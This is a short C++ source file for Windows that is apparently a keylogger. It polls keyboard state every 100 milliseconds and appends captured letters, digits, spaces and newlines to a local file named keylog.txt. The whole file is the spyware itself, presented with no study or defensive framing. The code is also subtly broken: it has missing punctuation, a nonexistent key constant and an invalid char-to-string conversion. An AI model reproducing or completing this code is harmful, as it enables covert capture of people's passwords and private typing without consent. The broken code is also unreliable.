#include <fstream>
#include <string>
#include <windows.h>

using namespace std;

ofstream out;
string buffer;
int counter

void keylist(char key);

int main()
{
   //array for every important character key
   char chType[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
   

   // Check key state every 100 milliseconds
   while(1==1)
   {
      for (int i=0; i<36; i++)
         keylist(chType[i];

      if(GetAsyncKeyState(VK_SPACE))
      {
         buffer.append(" ");
         counter++;
      }
         
      if(GetAsyncKeyState(VK_ENTER))
      {
         buffer.append("\n");
         counter ++;
      }
      //flush the string
      if(counter==15)
      {
         out.open("keylog.txt", ios::app);
         out << buffer;
         buffer = "";
         out.close();
         counter=0;
      }

      //every 100 ms
      Sleep(100);
    
   }
}

void keylist(char key)
{
   if(GetAsyncKeyState(key))
   {
      string skey = key;
      buffer.append(skey);
      counter++;
      
   }
}
